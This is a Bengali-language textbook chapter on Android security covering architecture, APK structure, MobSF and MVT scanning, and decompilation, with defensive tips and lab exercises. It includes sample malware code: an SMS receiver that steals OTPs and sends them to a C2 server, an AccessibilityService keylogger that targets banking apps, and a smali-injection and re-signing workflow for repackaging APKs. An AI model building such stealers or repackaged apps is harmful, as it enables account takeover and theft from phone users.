# অধ্যায় ৩১: Android ও Mobile Security

## সহজ কথায়

মানে দাঁড় করাও — তোমার পকেটের ফোনটা আসলে একটা **মিনি কম্পিউটার**। আর শত্রু যদি সেটাতে ঢুকতে পারে, তাহলে তোমার ব্যাংক, ছবি, চ্যাট, কল রেকর্ড — সব শেষ। এই চ্যাপ্টারে আমরা দেখবো কীভাবে Android-এর আর্কিটেকচার কাজ করে, কীভাবে হ্যাকাররা APK মডিফাই করে, আর সবচেয়ে গুরুত্বপূর্ণ — কীভাবে নিজেকে বাঁচাবে।

> **মজার Analogy:** Android-এর আর্কিটেকচার হলো একটা বহুতল ভবনের মতো। নিচতলায় Linux Kernel (সিকিউরিটি গার্ড), উপরের তলায় Libraries (ইলেকট্রিসিটি ও প্লাম্বিং), আর সবচেয়ে উপরে Apps (ফ্ল্যাটের ভাড়াটে)।

---

## ১. Android Architecture Layers

Android-এর পুরো স্ট্রাকচার ৪টা লেয়ারে ভাগ করা:

```
+------------------------------------------+
|         System Apps (Dialer, SMS, etc)     |
+------------------------------------------+
|         User-installed Apps               |
+------------------------------------------+
|         Application Framework             |
|  (Activity Manager, Content Providers,    |
|   Telephony Manager, Location Manager)    |
+------------------------------------------+
|         Android Runtime (ART) + Libraries |
|  (SQLite, OpenGL, WebKit, Media)          |
+------------------------------------------+
|         Hardware Abstraction Layer (HAL)  |
+------------------------------------------+
|         Linux Kernel                      |
|  (Drivers, Memory Mgmt, Process Mgmt)     |
+------------------------------------------+
```

**প্রতিটি লেয়ারের কাজ:**

| লেয়ার | কাজ |
|--------|------|
| **Linux Kernel** | মেমোরি ম্যানেজমেন্ট, প্রসেস আইসোলেশন, ডিভাইস ড্রাইভার |
| **HAL** | হার্ডওয়্যার ও সফটওয়্যারের মধ্যে ব্রিজ (ক্যামেরা, Bluetooth) |
| **ART** | অ্যাপ রান করায় (Android Runtime) — প্রতিটি অ্যাপ আলাদা স্যান্ডবক্সে |
| **Framework** | অ্যাপের জন্য API সরবরাহ করে (location, notifications) |
| **Apps** | তুমি যা ব্যবহার করো |

---

## ২. APK স্ট্রাকচার — কীভাবে একটি Android App বানানো হয়

APK মানে **Android Package Kit**। এটা আসলে একটা ZIP ফাইল। এক্সট্রাক্ট করলেই বোঝা যায়:

```
app.apk
├── AndroidManifest.xml    # অ্যাপের পরিচয়পত্র (binary XML)
├── classes.dex            # তোমার Java/Kotlin কোড (Dalvik Executable)
├── resources.arsc         # কম্পাইল করা রিসোর্স (string, color)
├── res/                   # Raw রিসোর্স (layout, images, drawable)
├── lib/                   # Native libraries (.so files — C/C++ কোড)
├── META-INF/              # সিগনেচার ও সার্টিফিকেট
└── assets/                # Additional assets (fonts, databases)
```

### AndroidManifest.xml — সবচেয়ে গুরুত্বপূর্ণ ফাইল

```xml
<!-- # AndroidManifest.xml — অ্যাপের পরিচয়পত্র -->
<manifest package="com.example.bankingapp">

    <!-- # অ্যাপের অনুমতি — এখানেই বিপদ! -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />        <!-- # SMS পড়তে পারে — OTP হাইজ্যাক! -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <application>
        <!-- # Activity — অ্যাপের স্ক্রিন -->
        <activity android:name=".LoginActivity"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- # Service — ব্যাকগ্রাউন্ডে চলে (কী ট্র্যাক করতে পারে) -->
        <service android:name=".KeyloggerService" />

        <!-- # BroadcastReceiver — SMS, কল শুনতে পারে -->
        <receiver android:name=".SMSReceiver"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- # ContentProvider — ডাটাবেজ শেয়ার করে (ডাটা লিক!) -->
        <provider android:name=".DataProvider"
                  android:authorities="com.example.bankingapp.data" />
    </application>
</manifest>
```

---

## ৩. APK Pentesting with MobSF — Step by Step

**MobSF (Mobile Security Framework)** হলো Android/iOS অ্যাপ সিকিউরিটি টেস্টিং-এর সবচেয়ে জনপ্রিয় টুল। চলো ধাপে ধাপে শিখি:

### Step 1: MobSF ইনস্টল করা

```bash
# # MobSF ডকার ইমেজ ডাউনলোড করি
docker pull opensecurity/mobile-security-framework-mobsf

# # MobSF রান করি (পোর্ট 8000)
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# # লোকাল ইন্সটল করতে চাইলে (Python)
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
pip install -r requirements.txt
python manage.py runserver 0.0.0.0:8000
```

### Step 2: APK আপলোড করে Analysis শুরু

```
1. Browser খুলো → http://localhost:8000
2. APK ফাইল টেনে আনি (যেমন: com.example.banking.apk)
3. "Upload & Scan" বাটনে ক্লিক
```

### Step 3: Analysis Results — কী কী পাবে?

MobSF স্ক্যান শেষে নিচের রিপোর্ট দেয়:

| সেকশন | কী পাওয়া যায় |
|--------|---------------|
| **Permissions** | কোন কোন অনুমতি নিচ্ছে (over-permission চেক) |
| **Manifest Analysis** | AndroidManifest.xml-এ দুর্বলতা (exported activities) |
| **Code Analysis** | ইনসিকিউর কোড (Hardcoded password, HTTP URL) |
| **Network Analysis** | কোন সার্ভারে ডাটা পাঠাচ্ছে |
| **Storage Analysis** | SharedPreferences, SQLite — ইনসিকিউর স্টোরেজ |
| **Binary Analysis** | ডিকম্পাইল করা কোডে সিক্রেট |

### Step 4: Manual Decompilation

```bash
# # APK এক্সট্রাক্ট (ZIP)
unzip target.apk -d apk_unpacked/

# # DEX → JAR (dex2jar)
d2j-dex2jar classes.dex -o output.jar

# # JAR → Java সোর্স (JD-GUI)
# # JD-GUI দিয়ে output.jar খুলে original Java কোড দেখা যায়

# # APKTool দিয়ে ডিকম্পাইল (smali কোড)
apktool d target.apk -o decompiled/
```

### Step 5: Malicious Code Detection

```bash
# # সম্ভাব্য বিপদজনক API কল খোঁজা
# # SMS রিড করে এমন কোড
grep -r "SMS_RECEIVED" decompiled/
grep -r "getMessageBody" decompiled/

# # হার্ডকোডেড পাসওয়ার্ড খোঁজা
grep -r "password" decompiled/ --include="*.smali"
grep -r "secret" decompiled/ --include="*.smali"

# # HTTP (নন-HTTPS) কল খোঁজা
grep -r "http://" decompiled/
```

---

## ৪. OTP/Password Hacking Android-এ — কীভাবে হয়?

### ৪.১ OTP Interception — SMS ম্যালওয়্যার

হ্যাকাররা কীভাবে OTP চুরি করে?

```java
// # ম্যালওয়্যার AndroidManifest.xml - SMS পারমিশন
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_SMS" />

<receiver android:name=".OTP_Interceptor">
    <intent-filter android:priority="999">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
```

```java
// # BroadcastReceiver — SMS ইন্টারসেপ্ট করে সার্ভারে পাঠায়
public class OTP_Interceptor extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String message = sms.getMessageBody();
            String sender = sms.getOriginatingAddress();

            // # OTP চিনতে প্যাটার্ন ম্যাচিং
            if (message.contains("OTP") || message.contains("verification")) {
                // # OTP এক্সট্রাক্ট করছে
                String otp = message.replaceAll("[^0-9]", "");

                // # হ্যাকারের সার্ভারে পাঠাচ্ছে
                sendToC2Server(sender, otp, message);
            }
        }
    }
}
```

### ৪.২ Keylogging — কীভাবে টাইপিং ট্র্যাক করে?

```java
// # AccessibilityService — Android-এর সবচেয়ে বিপজ্জনক পারমিশন
// # এটা দিয়ে ফেসবুক/ব্যাংক অ্যাপের ভিতরের সবকিছু পড়া যায়

public class KeyloggerService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            String packageName = event.getPackageName().toString();

            // # ব্যাংক বা ফিন্যান্সিয়াল অ্যাপ চেক
            if (packageName.contains("bank") || packageName.contains("nagad")) {
                // # প্রতি ৫ সেকেন্ডে টাইপ করা টেক্সট সার্ভারে পাঠায়
                sendToC2(packageName, text);
            }
        }
    }
}
```

### ৪.৩ কীভাবে বাঁচবে — OTP Security Tips

| কী করবে | কী করবে না |
|----------|------------|
| ✅ Authenticator App ব্যবহার করো (Google Authenticator, Authy) | ❌ SMS-based OTP-তে ভরসা করো না |
| ✅ App-এর Permission নিয়মিত চেক করো | ❌ অচেনা SMS রিডার অ্যাপ ইন্সটল করো না |
| ✅ Accessibility Service কে দিয়ো না অপরিচিত অ্যাপকে | ❌ Screen overlay দিয়ে phishing এড়িয়ে চলো |
| ✅ দ্বিতীয় layer হিসেবে biometric ব্যবহার করো | ❌ OTP কাউকে share করো না |

---

## ৫. MVT (Mobile Verification Toolkit) দিয়ে Mobile Secure করা

**MVT** — Amnesty International বানিয়েছে Pegasus স্পাইওয়্যার ডিটেক্ট করতে।

### ইনস্টল ও ব্যবহার

```bash
# # MVT ইনস্টল
pip3 install mvt

# # iOS ব্যাকআপ অ্যানালাইসিস
mvt-ios check-backup --output /tmp/ios_analysis /path/to/backup

# # Android-এর জন্য
mvt-android check-adb --output /tmp/android_analysis

# # STIX (Indicators of Compromise) ডাউনলোড
mvt-android download-iocs

# # ফুল স্ক্যান
mvt-android check-adb --ioc iocs/ --output /tmp/scan_result/
```

### MVT রিপোর্ট — কী দেখে?

```
# # অ্যানালাইসিস রিপোর্ট — সন্দেহজনক কিছু পেলে দেখাবে

[IDENTIFIED] SuspiciousProcess — com.unknown.keylogger
[IDENTIFIED] SuspiciousProcess — com.system.update (Pegasus pattern)
[WARNING] WhatsApp backup — unknown exfiltration detected
[INFO] Device last booted: 2025-01-15 — রিবুট দিলে কিছু ম্যালওয়্যার মুছে যায়
```

---

## ৬. Cracked Software — কীভাবে হ্যাকাররা বানায়?

### ৬.১ SMALI Injection — সবচেয়ে কমন পদ্ধতি

হ্যাকাররা **cracked APK** বানায় original APK-তে ম্যালিশিয়াস কোড inject করে:

```bash
# # ধাপ ১: APK ডিকম্পাইল
apktool d original.apk -o cracked/

# # ধাপ ২: Smali কোড inject (MainActivity.smali-তে ঢুকবে)
cat >> cracked/smali/com/example/app/MainActivity.smali << 'EOF'

# # হ্যাকারের C2 সার্ভারে কল করা মেথড
.method private sendDataToHacker()V
    .registers 4

    # # ডিভাইসের ইনফো সংগ্রহ
    iget-object v0, p0, Lcom/example/app/MainActivity;->CONTACTS:Landroid/content/ContentResolver;
    iget-object v1, p0, Lcom/example/app/MainActivity;->SMS:Landroid/content/ContentResolver;

    # # HTTP POST করে হ্যাকারের সার্ভারে পাঠাও
    invoke-static {v0, v1}, Lcom/example/app/Utils;->uploadData(Landroid/content/ContentResolver;Landroid/content/ContentResolver;)V

    return-void
.end method
EOF

# # ধাপ ৩: রি-বিল্ড
apktool b cracked/ -o cracked.apk

# # ধাপ ৪: সাইন করা (হ্যাকারের নিজস্ব সার্টিফিকেট দিয়ে)
jarsigner -keystore hacker.keystore cracked.apk hacker_alias
```

### ৬.২ Repackaged App — কীভাবে ভিকটিমদের কাছে পৌঁছায়?

1. Original APK ডাউনলোড (থার্ড-পার্টি সাইট থেকে)
2. Decompile → Malicious Code Inject
3. Recompile & Sign
4. Fake Google Play Page বানায়
5. Social Engineering দিয়ে ভিকটিমকে ডাউনলোড করায়

### ৬.৩ কীভাবে বাঁচবে — Safe App Installation

| ✅ করণীয় | ❌ বর্জনীয় |
|-----------|------------|
| শুধু Google Play থেকে ইন্সটল করো | ❌ APKPure, APKMirror-এর মতো থার্ড-পার্টি সাইট এড়িয়ে চলো |
| Play Protect চালু রাখো | ❌ "Mod APK" বা "Cracked Version" download করো না |
| App-এর Permission চেক করো | ❌ SMS Read / Accessibility Service অপরিচিত অ্যাপকে দিয়ো না |
| Regular Security Update দাও | ❌ Unknown Source থেকে APK install enable রেখো না |

---

## ল্যাব এক্সারসাইজ

> **ল্যাব ১:** MobSF সেটআপ করো এবং একটি সাধারণ APK স্ক্যান করে রিপোর্ট জেনারেট করো।

> **ল্যাব ২:** APKTool দিয়ে একটি APK ডিকম্পাইল করে AndroidManifest.xml-এ কোন কোন পারমিশন আছে তা চিহ্নিত করো।

> **ল্যাব ৩:** MVT ইন্সটল করে নিজের ফোন স্ক্যান করো — কোন suspicious process আছে কিনা চেক করো।

> **ল্যাব ৪:** একটি ডেমো ব্যাংকিং অ্যাপের decompiled code-এ hardcoded পাসওয়ার্ড বা API key খোঁজার চেষ্টা করো।

> **ল্যাব ৫:** নিজের ফোন থেকে একটি অ্যাপের ব্যাকআপ নিয়ে MVT দিয়ে অ্যানালাইসিস করো।

---

## মনে রাখো

| টপিক | মূল পয়েন্ট |
|-------|------------|
| Android Architecture | Linux Kernel + HAL + ART + Framework + Apps — প্রতিটি লেয়ার আলাদা |
| APK Structure | Manifest.xml, classes.dex, resources.arsc — ZIP ফরম্যাট |
| MobSF | Static + Dynamic Analysis — APK-র সব দুর্বলতা খুঁজে বের করে |
| OTP Hacking | SMS Receiver + Accessibility Service — সবচেয়ে বিপজ্জনক পারমিশন |
| MVT | Pegasus ও Spyware detect করে — Amnesty International-এর টুল |
| Cracked APK | Smali Injection + Repackaging — Sideload এড়িয়ে চলো |

> **শেষ কথা:** ভাই, ফোনে কিছু ইন্সটল করার আগে ১০ বার ভাবো। Permission চেক করো। অপ্রয়োজনীয় অ্যাপ ডিলিট করো। আর হ্যাঁ — "ফ্রি প্রিমিয়াম অ্যাপ" বলে কিছু নেই। ফ্রিতে কিছু পেলে, তুমিই প্রোডাক্ট!
